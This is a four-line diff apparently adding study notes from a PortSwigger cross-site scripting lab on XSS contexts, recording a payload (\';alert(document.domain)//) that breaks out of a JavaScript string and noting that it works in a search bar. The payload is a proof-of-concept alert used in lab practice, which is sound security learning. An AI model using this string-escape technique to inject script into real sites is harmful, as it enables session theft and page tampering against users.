@@ -1,0 +1,4 @@
+https://portswigger.net/web-security/cross-site-scripting/contexts
+breaking out of the java string
+\';alert(document.domain)//
+works in the search bar
